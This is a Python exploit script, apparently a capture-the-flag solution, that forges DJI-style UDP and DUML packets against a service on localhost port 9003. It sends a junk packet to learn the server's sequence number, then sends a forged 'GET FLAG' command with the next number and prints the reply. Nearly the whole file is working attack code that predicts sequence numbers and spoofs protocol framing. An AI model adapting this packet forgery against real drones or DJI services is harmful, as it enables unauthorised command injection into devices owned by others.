import struct
import socket
from crc import calc_hdr_checksum, calc_checksum
import threading
import random
import time

class DUMLPacket:
    def __init__(self, payload):        
        self.payload = payload

    def get_packed_data(self):
        payload = self.payload
        payload_length = len(self.payload)
        packet_length = payload_length + 11 + 2
        packed_header = struct.pack('<BH', 0x55, packet_length)
        header_checksum = struct.pack('<B', calc_hdr_checksum(0x77, packed_header, 3))
        packed_header += header_checksum
        
        dummy = b'\x00' * 5 + b'\x01\x01'
        whole_packet = packed_header + dummy + payload
        
        payload_checksum = struct.pack('<H', calc_checksum(whole_packet, len(whole_packet)))
        return whole_packet + payload_checksum

class DJIUDPPacket:
    def __init__(self, payload, seq):
        self.seq = seq
        self.payload = payload
        
    def get_packed_data(self):
        payload_length = len(self.payload)
        packet_length = (payload_length + 5) | (1 << 15)
        packed_header = struct.pack('<HHB', packet_length, self.seq, 0x5)
        return packed_header + self.payload

def send_and_receive_udp_packet(data):
    buffer_size = 1024
    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        udp_socket.sendto(data, (host, port))
        udp_socket.settimeout(5)
        response_data, server_address = udp_socket.recvfrom(buffer_size)
        return response_data
    except socket.timeout:
        return None
    finally:
        udp_socket.close()

def exploit():
    get_seq = DJIUDPPacket(b'A'*0x10, 0x4141)
    data = send_and_receive_udp_packet(get_seq.get_packed_data())
    seq = struct.unpack('<H', data[:2])[0]
    print(f"[*] correct seq : {hex(seq)}")

    duml_packet = DUMLPacket(b'GET FLAG').get_packed_data()
    get_flag = DJIUDPPacket(duml_packet, seq + 1)
    data = send_and_receive_udp_packet(get_flag.get_packed_data())
    print(f'[*] flag : {data.decode()}')

if __name__ == "__main__":
    host = 'localhost'
    port = 9003
    exploit()